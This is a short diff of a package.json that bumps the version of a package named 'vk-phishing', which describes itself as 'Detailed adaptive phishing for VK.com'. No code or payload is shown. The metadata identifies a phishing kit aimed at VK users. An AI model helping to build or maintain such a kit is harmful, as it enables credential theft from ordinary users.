@@ -1,6 +1,6 @@
 {
   "name": "vk-phishing",
-  "version": "1.3.0",
+  "version": "1.3.1",
   "description": "Detailed adaptive phishing for VK.com",
   "author": "AlexXanderGrib <pockomhadzzop@gmail.com>",
   "private": true,
